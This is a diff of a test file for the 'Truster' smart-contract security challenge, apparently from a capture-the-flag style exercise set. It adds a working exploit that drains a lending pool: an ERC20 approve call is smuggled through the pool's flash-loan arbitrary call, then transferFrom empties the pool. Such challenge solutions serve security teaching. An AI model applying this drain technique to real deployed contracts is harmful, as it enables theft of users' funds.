@@ -27,9 +27,23 @@ describe('[Challenge] Truster', function () {
         ).to.equal('0');
     });
 
-    it('Exploit', async function () {
+    it("Exploit", async function () {
         /** CODE YOUR EXPLOIT HERE  */
-    });
+    
+        const balanceOf = await this.token.balanceOf(this.pool.address);
+        const { data } = await this.token.populateTransaction.approve(
+          attacker.address,
+          balanceOf
+        );
+    
+        await this.pool
+          .connect(attacker)
+          .flashLoan(0, attacker.address, this.token.address, data);
+    
+        await this.token
+          .connect(attacker)
+          .transferFrom(this.pool.address, attacker.address, balanceOf);
+      });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
